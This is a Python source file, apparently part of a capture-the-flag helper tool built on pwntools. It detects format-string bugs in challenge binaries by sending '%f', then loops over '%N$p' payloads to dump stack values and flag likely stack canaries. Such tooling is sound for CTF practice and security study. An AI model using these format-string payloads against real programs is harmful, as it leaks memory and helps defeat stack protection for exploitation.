from core.challenge import Challenge
from utils.colors import Colors

import os

import logging
import pwn
logging.getLogger("pwnlib").setLevel(logging.ERROR)

def make_executable(file_path):
    if not os.access(file_path, os.X_OK):
        os.chmod(file_path, os.stat(file_path).st_mode | 0o111)

class Format_dump():
    def __init__(self, chall: Challenge):
        self.challenge = chall
        self.tester()
        self.process = None
        self.file= None
        self.flines=0
        self.elines=0
        self.range = 100

    def tester(self):
        for file in self.challenge.files:
            if '.' not in file['name']:
                make_executable(file['path'])
                self.process =pwn.process(file['path'])
                res = self.check(file['path'])
                self.process.close()
                self.file = file
                if not res: return
                print("{}[FORMAT] {}printf found{}".format(
                    Colors.CYAN, Colors.GREEN, Colors.END
                ))
                self.range = int(input("Entries to read from stack: "))
                self.dump_stack()
    
    def dump_stack(self):
        for i in range(0, self.range):
            self.process =pwn.process(self.file['path'])
            self.process.recvlines(self.flines)
            payload = '^%{}$p;'.format(i).encode('ascii')
            self.process.sendline(payload);
            r = self.process.recvlines(self.elines)
            for rec in r:
                if rec.decode().count(';') > 0:
                    dump = rec.decode().split("^")[1].split(";")[0]
                    fmt = "{} - {}".format(i, dump)
                    if len(dump) == (16+2) and dump.endswith("00"):
                        fmt = Colors.GREEN + fmt + " [Possible Canary] (format='{}')".format(payload.decode()[:-1][1:]) + Colors.END
                    print(fmt)
            self.process.close()

    def check(self, file:str):
        r = self.process.recvlines(timeout=1)
        self.flines = len(r)
        self.process.sendline(r"%f".encode('ascii'));
        try:
            r = self.process.recvlines(timeout=1)
        except:
            return False
        self.elines = len(r)
        for rec in r:
            if b"0.000000" in rec:
                return True
        return False